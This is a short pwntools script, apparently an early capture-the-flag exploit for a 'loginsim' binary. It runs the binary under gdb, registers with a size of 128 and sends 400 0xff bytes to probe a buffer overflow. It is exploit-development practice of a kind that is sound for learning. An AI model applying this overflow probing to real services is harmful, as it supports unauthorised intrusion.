from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./file")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": "/home/fresh/libc.so.6"}


#p = process("./loginsim")
#p = remote("1.2.3.4", 30246)
p = gdb.debug('./loginsim', '''
b *_register
b *_login''')

def register():
    p.recvline()
    p.sendline(b"1")

    time.sleep(1)

    p.recvline()
    p.sendline(b"128")


def payload():
    payload  = b''
    payload += b'\xff' * 400 + b'\r'

    p.recvline()
    p.sendline(payload)

register()
payload()


p.interactive()
